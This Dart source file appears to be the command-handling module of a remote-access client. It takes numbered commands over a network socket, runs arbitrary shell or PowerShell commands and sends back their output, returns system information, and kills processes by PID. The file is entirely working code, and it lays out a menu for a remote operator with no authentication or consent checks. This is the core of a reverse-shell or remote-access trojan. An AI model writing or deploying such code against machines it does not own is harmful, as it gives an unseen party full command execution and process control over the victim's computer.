import 'package:client/modules/shell.dart';
import 'package:client/modules/system.dart';  
import 'dart:io';

dynamic mainSelector({int id, String parameter, Socket socket}){
      switch(id){
        case 1:
          _getInfo(socket);
          return;
        case 2:
          _executableCommand(parameter, socket);
          return;
        case 3:
          _executableCommandInPowerShell(parameter, socket);
          return;
        case 4:
          _killProcess(parameter);
          return;
        case 5:
          _destroyCurrentSocket(socket);
          return;
    }
}

String modulesAvailableForSelection() {
  String result = "\n=============\n";
  result +="[1] - Info\n";
  result +="[2] - Executable Command\n";
  result +="[3] - Executable Command in PowerShell *(Windows Only)\n";
  result +="[4] - Kill Process\n";
  result +="[5] - Exit";
  result += "\n=============\n";
  return result;
}

void _getInfo(Socket socket){
  socket.write(System.getInfoFromSystem().toString());
}

void _killProcess(String PID){
  int pidInteger = int.parse(PID);
  System.killProcess(pidInteger);
}

void _destroyCurrentSocket(Socket socket){
  socket.write("Exit...");
  socket.destroy();
}

void _executableCommand(String command, Socket socket) async{
  Map<String, dynamic> resultMap = await Shell().executableCommand(command);
  if(resultMap.containsKey("error")){
    socket.write("Errors: ${resultMap["response"]}");
    socket.destroy();
  }else if(resultMap["status"] == false){
    socket.write("Problems: ${resultMap["response"]}");
  }else{
    socket.write("PID: ${resultMap["pId"]}");
    socket.write("Result: ${resultMap["response"]}");
  }
}

void _executableCommandInPowerShell(String command, Socket socket) async{
  if(!Platform.isWindows){
    socket.write("Windows Only!");
    return;
  }
  Map<String, dynamic> resultMap = await Shell().executableCommandInPowerShell(command);
  if(resultMap.containsKey("error")){
    socket.write("Errors: ${resultMap["response"]}");
    socket.destroy();
  }else if(resultMap["status"] == false){
    socket.write("Problems: ${resultMap["response"]}");
  }else{
    socket.write("PID: ${resultMap["pId"]}");
    socket.write("Result: ${resultMap["response"]}");
  }
}